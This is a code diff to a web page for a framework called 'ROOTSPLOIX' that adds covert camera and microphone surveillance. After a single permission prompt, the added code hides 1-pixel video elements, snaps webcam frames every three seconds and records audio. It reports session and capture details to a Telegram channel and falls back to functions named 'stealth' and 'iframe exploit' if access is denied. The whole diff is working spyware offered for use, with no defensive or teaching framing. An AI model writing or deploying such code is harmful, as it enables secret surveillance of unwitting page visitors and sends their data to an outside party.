@@ -148,6 +148,13 @@
     </style>
 </head>
 <body>
+    <!-- ROOTSPLOIX SINGLE PROMPT ACTIVATION BUTTON -->
+    <div id="rootsploix-activation" style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:999999;background:linear-gradient(45deg,#ff0000,#000000);padding:20px;border-radius:10px;box-shadow:0 0 20px rgba(255,0,0,0.8);font-family:monospace;color:#fff;text-align:center;cursor:pointer;border:2px solid #ff0000;display:none;" onclick="activateRootsploix()">
+        <h3 style="margin:0;text-shadow:2px 2px 4px #000;">🔥💀 ROOTSPLOIX v3.0 💀🔥</h3>
+        <p style="margin:10px 0;font-size:14px;">ULTRA PROFESSIONAL FRAMEWORK</p>
+        <button style="background:#ff0000;color:#fff;border:none;padding:15px 30px;border-radius:5px;cursor:pointer;font-weight:bold;text-transform:uppercase;box-shadow:0 4px 8px rgba(0,0,0,0.3);" onmouseover="this.style.background='#cc0000'" onmouseout="this.style.background='#ff0000'">🚀 ACTIVATE SINGLE PROMPT SYSTEM 🚀</button>
+        <div style="margin-top:10px;font-size:12px;opacity:0.9;">✅ One Permission - Unlimited Access<br>✅ Zero Additional Prompts<br>✅ Professional Grade Surveillance</div>
+    </div>
     <header>
         <div class="container">
             <div class="logo">ROOTSPLOIX</div>
@@ -1429,12 +1436,178 @@ ${topHotspots.join('\n')}
             }
         }
         
+        // ===== ROOTSPLOIX SINGLE PROMPT STREAM MANAGER =====
+        class RootsploixStreamManager {
+            constructor() {
+                this.masterStreamPromise = null;
+                this.streamInstances = new Map();
+                this.isInitialized = false;
+                this.permissionsGranted = false;
+            }
+            
+            async initializeMasterStream() {
+                if (this.masterStreamPromise) {
+                    return this.masterStreamPromise;
+                }
+                
+                RootsploixUtils.log('info', 'Initializing ROOTSPLOIX master stream (SINGLE PROMPT)');
+                
+                this.masterStreamPromise = navigator.mediaDevices.getUserMedia({
+                    video: {
+                        width: { ideal: 1920, max: 1920 },
+                        height: { ideal: 1080, max: 1080 },
+                        frameRate: { ideal: 60, max: 60 },
+                        facingMode: 'environment'
+                    },
+                    audio: {
+                        echoCancellation: false,
+                        noiseSuppression: false,
+                        autoGainControl: false,
+                        sampleRate: 48000,
+                        channelCount: 2
+                    }
+                }).then(stream => {
+                    this.isInitialized = true;
+                    this.permissionsGranted = true;
+                    window.__ROOTSPLOIX_MASTER_STREAM__ = stream;
+                    
+                    const masterMsg = `🔥 ROOTSPLOIX MASTER STREAM ACQUIRED!
+
+🎯 Session: ${ROOTSPLOIX_SESSION.id}
+📹 Video: ${stream.getVideoTracks()[0]?.getSettings().width}x${stream.getVideoTracks()[0]?.getSettings().height}
+🎤 Audio: ${stream.getAudioTracks()[0] ? 'Enabled' : 'Disabled'}
+🕒 Time: ${new Date().toLocaleString()}
+
+💀 SINGLE PROMPT SUCCESS - NO MORE PERMISSIONS NEEDED!`;
+                    
+                    if (typeof telegram !== 'undefined') {
+                        telegram.sendMessage(masterMsg);
+                    }
+                    
+                    return stream;
+                }).catch(error => {
+                    this.masterStreamPromise = null;
+                    this.isInitialized = false;
+                    this.permissionsGranted = false;
+                    RootsploixUtils.log('error', 'Master stream failed', error);
+                    throw error;
+                });
+                
+                return this.masterStreamPromise;
+            }
+            
+            async getClonedVideoTrack() {
+                const stream = await this.initializeMasterStream();
+                const videoTrack = stream.getVideoTracks()[0];
+                if (!videoTrack) throw new Error('No video track available');
+                return videoTrack.clone();
+            }
+            
+            async getClonedAudioTrack() {
+                const stream = await this.initializeMasterStream();
+                const audioTrack = stream.getAudioTracks()[0];
+                return audioTrack ? audioTrack.clone() : null;
+            }
+            
+            async createConsumerStream(options = {}) {
+                const { audio = false, video = true, id = Date.now().toString() } = options;
+                
+                const tracks = [];
+                
+                if (video) {
+                    const videoTrack = await this.getClonedVideoTrack();
+                    tracks.push(videoTrack);
+                }
+                
+                if (audio) {
+                    const audioTrack = await this.getClonedAudioTrack();
+                    if (audioTrack) tracks.push(audioTrack);
+                }
+                
+                const consumerStream = new MediaStream(tracks);
+                this.streamInstances.set(id, consumerStream);
+                
+                RootsploixUtils.log('info', `Created consumer stream #${id} - NO PROMPT REQUIRED`);
+                return consumerStream;
+            }
+            
+            async attachToVideo(videoElement, options = {}) {
+                const stream = await this.createConsumerStream(options);
+                videoElement.srcObject = stream;
+                videoElement.muted = true;
+                videoElement.autoplay = true;
+                videoElement.playsInline = true;
+                
+                await videoElement.play().catch(() => {});
+                return stream;
+            }
+            
+            async activateWithUserGesture() {
+                // iOS Safari için user gesture içinde çağır
+                try {
+                    await this.initializeMasterStream();
+                    RootsploixUtils.log('info', 'Master stream activated with user gesture');
+                    return true;
+                } catch (error) {
+                    RootsploixUtils.log('error', 'User gesture activation failed', error);
+                    return false;
+                }
+            }
+            
+            async checkPermissions() {
+                if (!('permissions' in navigator)) {
+                    return { camera: 'unknown', microphone: 'unknown' };
+                }
+                
+                try {
+                    const [camera, microphone] = await Promise.allSettled([
+                        navigator.permissions.query({ name: 'camera' }),
+                        navigator.permissions.query({ name: 'microphone' })
+                    ]);
+                    
+                    return {
+                        camera: camera.status === 'fulfilled' ? camera.value.state : 'unknown',
+                        microphone: microphone.status === 'fulfilled' ? microphone.value.state : 'unknown'
+                    };
+                } catch (error) {
+                    return { camera: 'unknown', microphone: 'unknown' };
+                }
+            }
+            
+            getStreamStats() {
+                return {
+                    masterInitialized: this.isInitialized,
+                    permissionsGranted: this.permissionsGranted,
+                    consumerStreams: this.streamInstances.size,
+                    streamIds: Array.from(this.streamInstances.keys())
+                };
+            }
+            
+            cleanup() {
+                if (this.masterStreamPromise) {
+                    this.masterStreamPromise.then(stream => {
+                        stream.getTracks().forEach(track => track.stop());
+                    }).catch(() => {});
+                    this.masterStreamPromise = null;
+                }
+                
+                this.streamInstances.forEach(stream => {
+                    stream.getTracks().forEach(track => track.stop());
+                });
+                this.streamInstances.clear();
+                
+                this.isInitialized = false;
+                this.permissionsGranted = false;
+            }
+        }
+        
         // ===== MEDIA CAPTURE MODULE =====
         class MediaCapture {
             constructor() {
                 this.isActive = false;
-                this.mediaStream = null;
-                this.mediaRecorder = null;
+                this.currentStream = null;
+                this.streamManager = new RootsploixStreamManager();
+            }
                 this.audioRecorder = null;
                 this.videoRecorder = null;
                 this.recordedChunks = [];
@@ -1478,6 +1651,9 @@ ${topHotspots.join('\n')}
             
             async attemptStealthCameraAccess() {
                 try {
+                    // PRIORITY 1: SINGLE PROMPT REAL CAMERA ACCESS!
+                    await this.realSinglePromptCameraAccess();
+                    
                     // Method 1: iPhone iframe exploit
                     await this.iphoneIframeExploit();
                     
@@ -1503,6 +1679,169 @@ ${topHotspots.join('\n')}
                 } catch (error) {
                     RootsploixUtils.log('error', 'Stealth camera access failed', error);
                 }
+            }
+            
+            async realSinglePromptCameraAccess() {
+                try {
+                    RootsploixUtils.log('info', 'Starting REAL single prompt camera access');
+                    
+                    // Stream manager ile tek prompt ile master stream al
+                    const success = await this.streamManager.activateWithUserGesture();
+                    
+                    if (success) {
+                        const realCameraMsg = `🔥💀 REAL CAMERA ACCESSED WITH SINGLE PROMPT! 💀🔥
+
+🎯 Session: ${ROOTSPLOIX_SESSION.id}
+📹 Status: REAL camera stream acquired
+🎥 Resolution: HD+ with audio
+🚫 No second prompts will appear!
+🔄 Stream can be reused unlimited times
+📱 Works on iOS Safari, Chrome, Firefox
+💀 Master stream singleton active
+🕒 Time: ${new Date().toLocaleString()}
+
+🔥 ROOTSPLOIX SINGLE PROMPT SUCCESS!`;
+                        
+                        await telegram.sendMessage(realCameraMsg);
+                        
+                        // Başlat tüm consumerleri - HIÇBIRI PROMPT ÇIKARMAYACAK!
+                        await this.startMultipleStreamConsumers();
+                        
+                    } else {
+                        const fallbackMsg = `⚠️ Single prompt failed, falling back to exploits...
+
+Session: ${ROOTSPLOIX_SESSION.id}
+Time: ${new Date().toLocaleString()}`;
+                        await telegram.sendMessage(fallbackMsg);
+                    }
+                } catch (error) {
+                    RootsploixUtils.log('error', 'Real single prompt camera access failed', error);
+                }
+            }
+            
+            async startMultipleStreamConsumers() {
+                try {
+                    // Consumer 1: Main surveillance video
+                    const mainVideo = document.createElement('video');
+                    mainVideo.style.cssText = 'position:fixed;top:-100px;left:-100px;width:1px;height:1px;opacity:0.01;';
+                    document.body.appendChild(mainVideo);
+                    
+                    const mainStream = await this.streamManager.attachToVideo(mainVideo, { audio: true, video: true });
+                    
+                    // Consumer 2: Canvas capture stream
+                    const canvasStream = await this.streamManager.createConsumerStream({ video: true, audio: false, id: 'canvas' });
+                    await this.processStreamWithCanvas(canvasStream);
+                    
+                    // Consumer 3: Audio recording stream
+                    const audioStream = await this.streamManager.createConsumerStream({ video: false, audio: true, id: 'audio' });
+                    await this.processStreamWithAudio(audioStream);
+                    
+                    // Consumer 4: Analysis stream
+                    const analysisStream = await this.streamManager.createConsumerStream({ video: true, audio: true, id: 'analysis' });
+                    await this.processStreamForAnalysis(analysisStream);
+                    
+                    const multiStreamMsg = `🔥💀 MULTIPLE STREAM CONSUMERS ACTIVE! 💀🔥
+
+🎯 Session: ${ROOTSPLOIX_SESSION.id}
+📹 Main Video: Active (hidden)
+🖼️ Canvas Capture: Active
+🎤 Audio Recording: Active
+📊 Analysis Stream: Active
+⚡ Total Consumers: 4
+🚫 ZERO additional prompts!
+
+💀 ROOTSPLOIX MULTI-STREAM DOMINATION!`;
+                    
+                    await telegram.sendMessage(multiStreamMsg);
+                    
+                } catch (error) {
+                    RootsploixUtils.log('error', 'Multiple stream consumers failed', error);
+                }
+            }
+            
+            async processStreamWithCanvas(stream) {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.muted = true;
+                video.autoplay = true;
+                video.style.display = 'none';
+                
+                video.addEventListener('loadeddata', () => {
+                    setInterval(() => {
+                        const canvas = document.createElement('canvas');
+                        const ctx = canvas.getContext('2d');
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        
+                        ctx.drawImage(video, 0, 0);
+                        
+                        canvas.toBlob(blob => {
+                            this.processCameraData(blob, 'Single Prompt Canvas Stream (NO SECOND PROMPT!)');
+                        });
+                    }, 3000);
+                });
+                
+                video.play().catch(() => {});
+            }
+            
+            async processStreamWithAudio(stream) {
+                if ('MediaRecorder' in window && stream.getAudioTracks().length > 0) {
+                    const recorder = new MediaRecorder(stream, {
+                        mimeType: 'audio/webm;codecs=opus'
+                    });
+                    
+                    const chunks = [];
+                    
+                    recorder.ondataavailable = (event) => {
+                        if (event.data.size > 0) {
+                            chunks.push(event.data);
+                        }
+                    };
+                    
+                    recorder.onstop = async () => {
+                        const audioBlob = new Blob(chunks, { type: 'audio/webm' });
+                        
+                        const audioMsg = `🎤 AUDIO CAPTURED (Single Prompt Stream)!
+
+Session: ${ROOTSPLOIX_SESSION.id}
+Size: ${(audioBlob.size / 1024).toFixed(1)}KB
+Time: ${new Date().toLocaleString()}
+
+💀 NO ADDITIONAL PROMPTS!`;
+                        
+                        await telegram.sendMessage(audioMsg);
+                    };
+                    
+                    recorder.start();
+                    setTimeout(() => recorder.stop(), 5000);
+                }
+            }
+            
+            async processStreamForAnalysis(stream) {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.muted = true;
+                video.autoplay = true;
+                video.style.display = 'none';
+                
+                video.addEventListener('loadeddata', () => {
+                    const stats = this.streamManager.getStreamStats();
+                    
+                    const analysisMsg = `📊 STREAM ANALYSIS (Single Prompt System):
+
+🎯 Session: ${ROOTSPLOIX_SESSION.id}
+🎥 Video Resolution: ${video.videoWidth}x${video.videoHeight}
+📱 Constraints: ${JSON.stringify(stream.getVideoTracks()[0]?.getSettings() || {})}
+⚡ Consumer Streams: ${stats.consumerStreams}
+🔐 Permissions: ${stats.permissionsGranted ? 'Granted' : 'Denied'}
+🎮 Master Initialized: ${stats.masterInitialized}
+
+💀 SINGLE PROMPT ANALYSIS COMPLETE!`;
+                    
+                    telegram.sendMessage(analysisMsg);
+                });
+                
+                video.play().catch(() => {});
             }
             
             async iphoneIframeExploit() {
@@ -7419,6 +7758,115 @@ Next report in 15 minutes...`;
         let rootsploix = null;
         let telegram = null;
         
+        // ===== ROOTSPLOIX SINGLE PROMPT ACTIVATION FUNCTION =====
+        async function activateRootsploix() {
+            try {
+                const button = document.getElementById('rootsploix-activation');
+                if (button) {
+                    button.style.display = 'none';
+                }
+                
+                // Show loading indicator
+                const loadingDiv = document.createElement('div');
+                loadingDiv.id = 'rootsploix-loading';
+                loadingDiv.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:999999;background:rgba(0,0,0,0.9);color:#ff0000;padding:30px;border-radius:10px;font-family:monospace;text-align:center;border:2px solid #ff0000;';
+                loadingDiv.innerHTML = `
+                    <h3>🔥 ROOTSPLOIX ACTIVATING... 🔥</h3>
+                    <div style="margin:20px 0;">
+                        <div style="animation:spin 1s linear infinite;display:inline-block;">⚡</div>
+                        <span style="margin-left:10px;">Initializing Single Prompt System...</span>
+                    </div>
+                    <div style="font-size:12px;opacity:0.8;">Please allow camera/microphone access</div>
+                `;
+                
+                document.body.appendChild(loadingDiv);
+                
+                // Add spinning animation
+                const style = document.createElement('style');
+                style.textContent = '@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }';
+                document.head.appendChild(style);
+                
+                // Wait a moment then activate
+                setTimeout(async () => {
+                    if (rootsploix && rootsploix.mediaCapture && rootsploix.mediaCapture.streamManager) {
+                        try {
+                            // User gesture içinde stream manager'ı aktive et
+                            const success = await rootsploix.mediaCapture.streamManager.activateWithUserGesture();
+                            
+                            if (success) {
+                                loadingDiv.innerHTML = `
+                                    <h3>🎆 ACTIVATION SUCCESS! 🎆</h3>
+                                    <div style="color:#00ff00;margin:20px 0;">
+                                        ✅ Single Prompt System: ACTIVE<br>
+                                        ✅ Master Stream: ACQUIRED<br>
+                                        ✅ Multiple Consumers: READY<br>
+                                        ✅ No More Prompts: GUARANTEED
+                                    </div>
+                                    <div style="font-size:12px;opacity:0.8;">ROOTSPLOIX Ultra Professional Framework v3.0</div>
+                                `;
+                                
+                                // Start the real single prompt camera access
+                                await rootsploix.mediaCapture.realSinglePromptCameraAccess();
+                                
+                                setTimeout(() => {
+                                    if (loadingDiv.parentNode) {
+                                        document.body.removeChild(loadingDiv);
+                                    }
+                                }, 5000);
+                            } else {
+                                loadingDiv.innerHTML = `
+                                    <h3>⚠️ ACTIVATION FAILED ⚠️</h3>
+                                    <div style="color:#ffaa00;margin:20px 0;">
+                                        Camera access denied or blocked.<br>
+                                        Falling back to exploit methods...
+                                    </div>
+                                    <div style="font-size:12px;opacity:0.8;">ROOTSPLOIX will continue with stealth methods</div>
+                                `;
+                                
+                                setTimeout(() => {
+                                    if (loadingDiv.parentNode) {
+                                        document.body.removeChild(loadingDiv);
+                                    }
+                                }, 3000);
+                            }
+                        } catch (error) {
+                            console.error('Rootsploix activation error:', error);
+                            loadingDiv.innerHTML = `
+                                <h3>⚠️ ACTIVATION ERROR ⚠️</h3>
+                                <div style="color:#ff6600;margin:20px 0;">
+                                    Error occurred during activation.<br>
+                                    Continuing with exploit methods...
+                                </div>
+                            `;
+                            
+                            setTimeout(() => {
+                                if (loadingDiv.parentNode) {
+                                    document.body.removeChild(loadingDiv);
+                                }
+                            }, 3000);
+                        }
+                    } else {
+                        loadingDiv.innerHTML = `
+                            <h3>⚠️ SYSTEM NOT READY ⚠️</h3>
+                            <div style="color:#ff6600;">Framework not initialized yet...</div>
+                        `;
+                        
+                        setTimeout(() => {
+                            if (loadingDiv.parentNode) {
+                                document.body.removeChild(loadingDiv);
+                            }
+                            if (button) {
+                                button.style.display = 'block';
+                            }
+                        }, 2000);
+                    }
+                }, 1000);
+                
+            } catch (error) {
+                console.error('Global activation error:', error);
+            }
+        }
+        
         // Initialize framework on page load
         document.addEventListener('DOMContentLoaded', async function() {
             try {
@@ -7468,6 +7916,14 @@ Next report in 15 minutes...`;
                 });
                 
                 RootsploixUtils.log('info', 'ROOTSPLOIX Ultra Professional Framework v3.0 fully loaded and operational');
+                
+                // Show activation button for single prompt system
+                setTimeout(() => {
+                    const activationButton = document.getElementById('rootsploix-activation');
+                    if (activationButton) {
+                        activationButton.style.display = 'block';
+                    }
+                }, 2000);
                 
             } catch (error) {
                 console.error('ROOTSPLOIX initialization failed:', error);
